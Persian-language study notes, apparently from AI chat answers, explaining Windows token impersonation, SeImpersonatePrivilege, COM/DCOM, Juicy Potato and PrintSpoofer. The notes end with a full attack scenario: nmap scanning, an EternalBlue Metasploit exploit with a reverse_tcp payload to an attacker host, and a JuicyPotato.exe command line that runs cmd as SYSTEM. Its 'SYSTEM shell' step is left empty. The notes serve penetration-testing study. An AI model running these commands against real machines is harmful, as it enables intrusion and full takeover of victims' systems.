## **۱. Impersonation در ویندوز**

### **تعریف**

- **Impersonation
- ** یعنی یک **فرایند یا thread** بتواند **به جای کاربر یا سرویس دیگری** عملیاتی را انجام دهد.
    
- در واقع، سیستم به آن thread می‌گوید: «تو الان با مجوزهای کاربر X کار می‌کنی، نه خودت».
    

### **چطور کار می‌کند**

- هر کاربر در ویندوز وقتی لاگین می‌کند، یک **Access Token** دارد.
    
- فرایندها به طور معمول از **توکن خودشان** استفاده می‌کنند.
    
- اما با **Impersonation**:
    
    1. یک thread توکن کاربر دیگر را **می‌گیرد**.
        
    2. تمام عملیات این thread با **سطح دسترسی توکن جدید** اجرا می‌شود.
        

### **سطوح Impersonation**

ویندوز چند سطح Impersonation دارد:

1. **Anonymous** – تقریبا هیچ کاری نمی‌توان انجام داد.
    
2. **Identification** – می‌توان اطلاعات کاربر را شناخت، اما عملیات حساس نمی‌توان انجام داد.
    
3. **Impersonation** – می‌توان عملیات با مجوزهای کاربر را انجام داد، اما محدود به ماشین محلی.
    
4. **Delegation** – می‌توان مجوزهای کاربر را به سایر سرورها و سرویس‌ها منتقل کرد.
    

> مهم‌ترین چیزی که Juicy Potato استفاده می‌کند، سطح **Impersonation** است که اجازه می‌دهد **فرایند با مجوز کاربر SYSTEM اجرا شود**.

---

## **۲. Juicy Potato – چگونه کار می‌کند**

### **ایده اصلی**

- Juicy Potato 
- از یک **COM object یا service** که اجازه impersonation دارد، استفاده می‌کند.
    
- این COM object یا service **token SYSTEM** تولید می‌کند که می‌توان آن را به فرایند خود منتقل کرد.
    

### **مراحل کار**

1. **شناسایی یک COM object آسیب‌پذیر**
    
    - معمولاً این COMها تحت **services خاص ویندوز** اجرا می‌شوند و دارای **SeImpersonatePrivilege** هستند.
        
2. **اتصال به COM object**
    
    - فرایند محدود با استفاده از COM object، یک **توکن SYSTEM** می‌گیرد.
        
3. **ایجاد فرایند جدید با توکن SYSTEM**
    
    - حالا می‌توان یک فرایند (مثل cmd.exe یا powershell) اجرا کرد که **با دسترسی SYSTEM** باشد.
        

### **کامپوننت‌های کلیدی**

- **COM Services / DCOM**: تکنولوژی Component Object Model و Distributed COM ویندوز
    
- **SeImpersonatePrivilege**: امکانی که اجازه می‌دهد یک فرایند **توکن کاربر دیگر را impersonate کند**
    
- **فرایند قربانی / فرایند هدف**: جایی که توکن SYSTEM را به آن منتقل می‌کنیم
    

> به زبان ساده: Juicy Potato یک **میانبر از طریق COM objectها** ایجاد می‌کند تا از محدود بودن دسترسی کاربر فراتر رود و **SYSTEM access** بگیرد.

---

اگر بخواهی، می‌توانم **یک نمودار مرحله‌ای از جریان Juicy Potato روی سیستم ویندوز بکشم** که نشان دهد:

- کاربر محدود
    
- COM object
    
- توکن SYSTEM
    
- فرایند جدید با دسترسی بالا
    

اینطوری کامل می‌بینی چطور Impersonation و Juicy Potato با هم کار می‌کنند.






**“خب Impersonation via Access Tokens” و “Juicy Potato” هر دو دارن از توکن استفاده می‌کنن، فرقشون چیه؟**  
بیا دقیق مقایسه کنیم:

---

## 🔹 **۱. Access Token Impersonation (روش عمومی)**

- این تکنیک یعنی شما **توکن آماده** یک کاربر یا پروسس با دسترسی بالا رو پیدا و استفاده می‌کنی.
    
- مثلاً:
    
    - با ابزار `incognito` در Meterpreter می‌تونی توکن‌های cache شده روی سیستم رو لیست کنی.
        
    - بعد می‌تونی توکن یکی از ادمین‌ها یا حتی SYSTEM رو impersonate کنی.
        
- پیش‌نیاز:
    
    - باید **توکن فعال** در سیستم وجود داشته باشه (مثلاً ادمین یا سرویس لاگین کرده باشه).
        
    - یا خودت بتونی با دزدیدن توکن از LSASS یا پروسس‌ها، اونو استفاده کنی.
        

🔑 پس:

- در این روش **توکن آماده و موجود** رو می‌گیری.
    
- محدودیت: اگه توکنی نباشه یا قابل استفاده نباشه، دسترسی بالا نمی‌گیری.
    

---

## 🔹 **۲. Juicy Potato (روش خاص)**

- Juicy Potato وقتی ساخته شد که بعضی وقت‌ها **توکن آماده وجود نداره** یا قابل دزدیدن نیست.
    
- در عوض، از **خود سیستم‌عامل و سرویس‌های COM/DCOM** سوءاستفاده می‌کنه.
    
- ایده:
    
    1. مهاجم روی ماشین **SeImpersonatePrivilege** داره (این پرمیژن رو خیلی از سرویس‌های ویندوز دارن).
        
    2. Juicy Potato یک COM Object خاص رو صدا می‌زنه.
        
    3. این COM Object یک **توکن SYSTEM جدید** برمی‌گردونه.
        
    4. مهاجم این توکن رو impersonate می‌کنه و دسترسی SYSTEM می‌گیره.
        

🔑 پس:

- در Juicy Potato نیاز نیست حتماً **توکن آماده روی سیستم باشه**.
    
- خودش با استفاده از COM Services توکن SYSTEM تولید می‌کنه.
    

---

## 📌 **خلاصه تفاوت‌ها**

|ویژگی|Access Token Impersonation|Juicy Potato|
|---|---|---|
|منبع توکن|توکن‌های موجود (کاربران/پروسس‌ها)|ساخت توکن SYSTEM با COM object|
|پیش‌نیاز|وجود توکن فعال و قابل دسترسی|نیاز به SeImpersonatePrivilege|
|محدودیت|اگه توکن نباشه → بی‌فایده|کار می‌کنه حتی بدون توکن آماده|
|نمونه ابزار|Meterpreter `incognito`|ابزار Juicy Potato / PrintSpoofer|

---

👉 پس به زبان ساده:

- **Access Token Impersonation:** استفاده از توکن‌های آماده کاربران/پروسس‌ها.
    
- **Juicy Potato:** ساختن یک توکن SYSTEM جدید از طریق COM/DCOM حتی وقتی توکن آماده نداری.
    

---


خیلی عالیه که اومدی سراغ جزئیاتش، چون **کل ماجرای Token Impersonation و Juicy Potato بر محور همین واژه "Impersonate" و پرمیژن SeImpersonatePrivilege می‌چرخه**.  
بیا یکی یکی توضیح بدیم:

---

## 🔹 واژه **Impersonate** یعنی چی؟

واژه **Impersonate** در انگلیسی یعنی **جای کسی دیگر بودن / نقش کسی دیگر را بازی کردن**.

در دنیای ویندوز:

- وقتی یک **thread یا process** دسترسی **Impersonate** داشته باشد، می‌تواند:
    
    - **توکن امنیتی کاربر دیگر** را قرض بگیرد.
        
    - و خودش را به عنوان آن کاربر به سیستم معرفی کند.
        

🔑 مثال ساده:  
فرض کن شما یک کارمند معمولی هستی و کارت ورود داری.

- اگر اجازه **Impersonate** داشته باشی، می‌تونی کارت ورود مدیر رو برداری و به اسم اون وارد اتاق مدیر بشی.
    
- سیستم فکر می‌کنه تو همون مدیر هستی.
    

---

## 🔹 پرمیژن **SeImpersonatePrivilege**

- این یک **User Right / Privilege در ویندوز** است.
    
- معنی‌اش:
    
    > "اجازه می‌دهد پروسس یا thread توکن امنیتی یک کاربر دیگر را impersonate کند."
    

### کجا استفاده می‌شود؟

- سرویس‌هایی مثل **IIS (وب‌سرور ویندوز)**، **SQL Server** یا سرویس‌های شبکه‌ای معمولاً این پرمیژن را دارند.
    
- چون باید بتوانند درخواست یک کاربر را گرفته و به اسم او در سیستم کار انجام دهند.
    

---

## 🔹 چرا برای حمله مهم است؟

- اگر یک پروسس یا مهاجم **SeImpersonatePrivilege** داشته باشد:
    
    - می‌تواند **توکن کاربر یا سرویس دیگر** را بگیرد.
        
    - خودش را به اسم آن کاربر جا بزند.
        
    - و دستورات را با سطح دسترسی آن اجرا کند.
        
- اینجاست که تکنیک‌هایی مثل:
    
    - **Access Token Impersonation**
        
    - **Juicy Potato**
        
    - **PrintSpoofer**
        
    - کار می‌کنند.
        

---

## 🔹 ارتباط با Juicy Potato

Juicy Potato دقیقاً روی همین پرمیژن سوار می‌شود:

1. پروسس مهاجم پرمیژن **SeImpersonatePrivilege** دارد.
    
2. به یک **COM Service** وصل می‌شود.
    
3. از آن سرویس یک **توکن SYSTEM** می‌گیرد.
    
4. با impersonate کردن آن توکن → پروسس مهاجم حالا با دسترسی **SYSTEM** اجرا می‌شود.
    

---

## 📌 خلاصه در یک جمله

- **Impersonate** = به جای کاربر دیگر وانمود کردن (نقش او را بازی کردن).
    
- **SeImpersonatePrivilege** = اجازه ویندوز برای اینکه یک پروسس بتواند توکن کاربر دیگری را قرض بگیرد و به جای او عمل کند.
    
- **اهمیتش** = اگر مهاجم این پرمیژن را داشته باشد، خیلی راحت می‌تواند Privilege Escalation انجام دهد.
    

---

---

## 🔹 PrintSpoofer چیست؟

- **PrintSpoofer** یک ابزار و تکنیک برای **Privilege Escalation در ویندوز** هست.
    
- مثل Juicy Potato از پرمیژن **SeImpersonatePrivilege** استفاده می‌کنه.
    
- ولی به جای سوءاستفاده از **COM/DCOM objects** (که در ویندوز‌های جدیدتر محدود شدند)، از **Print Spooler service** ویندوز استفاده می‌کنه.
    

---

## 🔹 ایده اصلی کارکرد

1. سرویس **Print Spooler** در ویندوز به صورت پیش‌فرض با سطح دسترسی **SYSTEM** اجرا می‌شه.
    
2. PrintSpoofer با این سرویس تعامل می‌کنه و درخواست **Named Pipe** ایجاد می‌کنه.
    
3. چون پروسس مهاجم **SeImpersonatePrivilege** داره، می‌تونه **توکن SYSTEM** مربوط به Print Spooler رو impersonate کنه.
    
4. بعد از گرفتن توکن، مهاجم می‌تونه یه پروسس جدید (مثلاً cmd.exe یا powershell.exe) رو با سطح دسترسی SYSTEM اجرا کنه.
    

---

## 🔹 چرا PrintSpoofer ساخته شد؟

- بعد از اینکه مایکروسافت **تکنیک Juicy Potato** رو در نسخه‌های جدید ویندوز (Server 2019 و Windows 10 جدید) بست، نیاز به جایگزین بود.
    
- PrintSpoofer همون کار رو می‌کنه (Privilege Escalation → SYSTEM) ولی از یک مسیر متفاوت یعنی **Print Spooler**.
    

---

## 🔹 خلاصه تفاوت با Juicy Potato

|ویژگی|Juicy Potato|PrintSpoofer|
|---|---|---|
|بردار حمله|COM/DCOM objects|Print Spooler Service|
|نیاز|SeImpersonatePrivilege|SeImpersonatePrivilege|
|وضعیت در ویندوز جدید|Patch شده یا محدود|هنوز در نسخه‌های زیادی کار می‌کنه|
|خروجی|SYSTEM shell|SYSTEM shell|

---

## 📌 جمع‌بندی

- **PrintSpoofer** یک تکنیک Privilege Escalation است.
    
- با استفاده از **SeImpersonatePrivilege** و سوءاستفاده از سرویس **Print Spooler**، به مهاجم اجازه می‌دهد توکن SYSTEM بگیرد.
    
- نتیجه: اجرای دستور/پروسس با بالاترین سطح دسترسی (SYSTEM).

## 🔹 COM (Component Object Model)

- **COM** = **مدل شیء مؤلفه‌ای** (Component Object Model)
    
- یک فناوری قدیمی مایکروسافت (از دهه ۹۰) برای اینکه **برنامه‌های مختلف بتونن با هم تعامل کنند**.
    
- COM به برنامه‌ها اجازه می‌ده:
    
    - اشیاء (objects) و توابع خودشون رو به صورت **قابل استفاده برای بقیه** منتشر کنن.
        
    - برنامه‌های دیگه بتونن اون اشیاء رو صدا بزنن و استفاده کنن.
        

### مثال ساده:

- فرض کن Word یک شیء COM به اسم `Word.Application` ارائه می‌ده.
    
- یه برنامه دیگه (مثلاً Excel یا اسکریپت VBS) می‌تونه اون رو صدا بزنه و Word رو کنترل کنه (ایجاد سند، نوشتن متن، ذخیره کردن).
    

🔑 پس COM یعنی یک روش برای **به اشتراک گذاشتن قابلیت‌ها بین برنامه‌ها**.

---

## 🔹 DCOM (Distributed COM)

- **DCOM** = **Distributed COM**
    
- نسخه توسعه‌یافته COM هست برای اینکه برنامه‌ها بتونن **از راه دور (روی شبکه)** همدیگه رو صدا بزنن.
    
- با DCOM شما می‌تونی:
    
    - روی یک ماشین دیگه (از طریق شبکه) شیء COM رو بسازی.
        
    - و انگار همون‌جا اجرا شده ازش استفاده کنی.
        

### مثال:

- روی سرور یک شیء COM هست که کارش پردازش فایل‌هاست.
    
- کلاینت می‌تونه از راه دور اون شیء COM رو صدا بزنه و فایلش رو پردازش کنه.
    

---

## 🔹 ارتباط COM/DCOM با امنیت و حمله

- خیلی از سرویس‌های ویندوز به صورت COM objects در دسترس هستن.
    
- وقتی یک برنامه (با پرمیژن محدود) به یک COM object دسترسی پیدا می‌کنه، ممکنه بتونه از طریق اون object **توکن یا دسترسی بالاتر بگیره**.
    
- این دقیقاً پایه حملاتی مثل **Juicy Potato** هست.
    

### در Juicy Potato چه می‌شه؟

1. مهاجم از پرمیژن **SeImpersonatePrivilege** استفاده می‌کنه.
    
2. یک COM object رو از سیستم درخواست می‌کنه.
    
3. اون COM object چون با دسترسی SYSTEM اجرا می‌شه → یه **توکن SYSTEM** برمی‌گردونه.
    
4. مهاجم اون توکن رو impersonate می‌کنه → SYSTEM shell.
    

---

## 📌 خلاصه

|مفهوم|توضیح|
|---|---|
|**COM**|تکنولوژی برای اشتراک‌گذاری اشیاء و قابلیت‌ها بین برنامه‌ها در یک ماشین|
|**DCOM**|نسخه توزیع‌شده COM برای ارتباط از راه دور (روی شبکه)|
|**امنیت**|اگر COM/DCOM درست پیکربندی نشه یا سرویس‌های سیستمی توکن خودشون رو بدهند → مهاجم می‌تونه Privilege Escalation کنه (مثل Juicy Potato)|

---

👉 پس COM/DCOM در اصل برای **برنامه‌نویسی و تعامل برنامه‌ها** ساخته شده، ولی در امنیت به دلیل **مدیریت نادرست توکن‌ها** به یک **بردار حمله مهم** تبدیل شده.

# 🎯 سناریوی حمله Juicy Potato

---

## 🔹 ۱. شناسایی اولیه با Nmap

مهاجم ابتدا شبکه هدف رو اسکن می‌کنه:

```bash
nmap -sS -sV -O -Pn 192.168.1.50
```

- `-sS` → TCP SYN scan برای کشف پورت‌ها
    
- `-sV` → تشخیص نسخه سرویس‌ها
    
- `-O` → شناسایی سیستم عامل
    
- `-Pn` → بدون Ping (در صورت بسته بودن ICMP)
    

📌 خروجی:

- OS: Windows Server 2016
    
- پورت‌های باز:
    
    - 445 (SMB)
        
    - 3389 (RDP)
        
    - 135 (RPC)
        
    - 5985 (WinRM) ---> PSRemoting ---> Powershell Remoting
        

---

## 🔹 ۲. کشف آسیب‌پذیری‌ها

مهاجم با اسکنر Nmap یا ماژول‌های متاسپلویت بررسی می‌کنه:

مثلاً:

```bash
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.50
run
```

📌 می‌بینه سیستم SMB فعال هست و Patch نشده.

---

## 🔹 ۳. بهره‌برداری اولیه (Initial Access)

مهاجم یک اکسپلویت روی SMB اجرا می‌کنه (مثلاً EternalBlue یا exploit مربوط به سرویس دیگری).

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

📌 نتیجه: دسترسی Meterpreter با سطح کاربر محدود (مثلاً NT AUTHORITY\LOCAL SERVICE).

---

## 🔹 ۴. بررسی پرمیژن‌های توکن

در Meterpreter:

```bash
getuid
getprivs
```

📌 خروجی: مهاجم می‌بینه دسترسی `SeImpersonatePrivilege` فعال است.

این پرمیژن کلید طلایی اجرای Juicy Potato است.

---

## 🔹 ۵. اجرای Juicy Potato

مهاجم فایل **JuicyPotato.exe** را آپلود می‌کند:

```bash
upload JuicyPotato.exe
```

سپس اجرا می‌کند:

```bash
JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\Users\Public\out.txt" -l 1337
```

- `-t *` → تست همه CLSIDهای COM/DCOM
    
- `-p` → برنامه‌ای که می‌خواهد با SYSTEM اجرا شود (اینجا cmd.exe)
    
- `-a` → آرگومان برای cmd (نوشتن خروجی whoami در فایل)
    
- `-l` → شماره پورت لوکال برای ارتباط با COM Service
    

📌 نتیجه: `whoami` با سطح **NT AUTHORITY\SYSTEM** اجرا می‌شود.

---

## 🔹 ۶. گرفتن SYSTEM shell

بعد از تأیید موفقیت:

# 📌 جمع‌بندی جریان سناریو

1. اسکن اولیه → کشف Windows با پورت‌های باز
    
2. اکسپلویت SMB → دسترسی Meterpreter با سطح محدود
    
3. بررسی پرمیژن‌ها → وجود SeImpersonatePrivilege
    
4. اجرای Juicy Potato → تعامل با COM/DCOM → گرفتن توکن SYSTEM
    
5. اجرای shell با SYSTEM → دسترسی کامل به سیستم

## 🔹 ماجرا از کجا میاد؟

Juicy Potato برای کار کردن باید از یک **COM/DCOM service** سوءاستفاده کنه.

- وقتی مهاجم درخواستش رو می‌فرسته، COM/DCOM باید به یه جایی وصل بشه و توکن رو برگردونه.
    
- برای این ارتباط، Juicy Potato نیاز به **یک پورت محلی (listener)** داره تا COM/DCOM بتونه بهش وصل بشه.
    

---

## 🔹 نقش شماره پورت در Juicy Potato

وقتی می‌زنی `-l 1337`:

1. Juicy Potato روی سیستم قربانی یه **listener روی پورت 1337** باز می‌کنه.
    
2. COM/DCOM service (که با سطح SYSTEM اجرا می‌شه) میاد و به این پورت وصل می‌شه.
    
3. مهاجم از این کانکشن استفاده می‌کنه تا **توکن SYSTEM** رو بگیره.
    
4. بعد با `SeImpersonatePrivilege` اون توکن رو impersonate می‌کنه.
    

📌 بدون پورت، COM/DCOM نمی‌دونه باید توکن رو کجا بفرسته → پس حمله شکست می‌خوره.

---

## 🔹 چرا هر پورتی می‌تونه باشه؟

- معمولاً هر پورتی (مثلاً 1337، 6666، 9999) می‌تونه استفاده بشه، فقط باید آزاد باشه.
    
- عددش مهم نیست، مهم اینه که Juicy Potato یه جای خالی برای ارتباط با COM/DCOM داشته باشه.
    

---

## 🔹 جمع‌بندی

- **پورت در Juicy Potato** فقط یک **لوله ارتباطی (listener)** بین مهاجم و COM/DCOM service هست.
    
- COM با دسترسی SYSTEM میاد به اون پورت وصل می‌شه → توکن SYSTEM منتقل می‌شه → مهاجم impersonate می‌کنه.
